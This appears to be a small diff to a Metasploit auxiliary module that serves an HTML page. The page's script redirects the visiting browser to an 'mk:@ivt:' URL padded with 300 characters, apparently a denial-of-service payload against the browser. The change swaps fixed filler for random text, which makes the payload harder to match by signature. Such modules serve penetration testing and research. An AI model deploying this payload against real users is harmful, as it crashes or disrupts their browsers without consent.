@@ -54,7 +54,7 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status('Sending HTML...')
     html = '<html><head></head><body>'
-    html << "<script>window.location.replace('mk:@ivt:#{'a'*300}')</script>"
+    html << "<script>window.location.replace('mk:@ivt:#{Rex::Text.rand_text_alpha(300)}')</script>"
     html << '</body></html>'
     send_response(cli, html, {'Content-Type'=>'text/html'})
   end
